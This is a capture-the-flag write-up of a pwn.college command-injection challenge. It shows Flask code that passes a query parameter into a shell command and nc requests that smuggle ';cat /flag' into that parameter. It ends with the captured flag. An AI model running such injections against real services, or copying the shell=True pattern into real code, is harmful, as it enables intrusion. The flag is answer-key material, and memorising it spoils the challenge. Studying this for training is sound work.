---
layout: page
title: "Challenge: CDMi 1"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


**Category**: Web Security  
**Platform**: pwn.college  
**Level**: Intermediate  
**Vulnerability**: Command Injection  
**Goal**: Execute arbitrary shell commands to read the `flag` file.

# Command Injection 1 — Writeup
---
## 🧠 Challenge Overview

In this challenge, we are provided with a Flask-based Python web server that exposes an endpoint at `/puzzle`. This endpoint accepts a `topdir` query parameter and runs the `ls -l` command on the specified directory.

---

## 🔍 Server Code Analysis

Here is the vulnerable code:

```python
@app.route("/puzzle", methods=["GET"])
def challenge():
    arg = flask.request.args.get("topdir", "/challenge")
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        encoding="latin",
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/puzzle"><input type=text name=topdir><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """
```
---
## 🔥 Vulnerability

The server takes user input (topdir) and injects it directly into a shell command (ls -l {arg}) with shell=True, allowing arbitrary shell command execution. This is a classic command injection vulnerability.
---
## 🎯 Exploitation Steps

### Step 1: List root directory

```bash
hacker@web-security~cmdi-1:~$ printf "GET /puzzle?topdir=/ HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n" | nc challenge.localhost 80
```
Response includes the contents of /, revealing the presence of /flag:
```bash
-r--------    1 root root   60 Jul 20 04:23 flag
```

### Step 2: Inject command using ; to read the flag

```bash
hacker@web-security~cmdi-1:~$ printf "GET /puzzle?topdir=/;cat+/flag HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n" | nc challenge.localhost 80
```
Response:
```bash
pwn.college{YQtUmMdXcZJ2zAZL75q30YR820m.QX1YTN2wSM0IzMyEzW}
```
---
## How the Injection Worked

The command constructed on the server:
```bash
ls -l /;cat /flag
```
Using ; allows chaining of commands — ls -l / runs first, followed by cat /flag, which leaks the contents of the flag file.
---
## Flag
```bash
pwn.college{YQtUmMdXcZJ2zAZL75q30YR820m.QX1YTN2wSM0IzMyEzW}
```
---
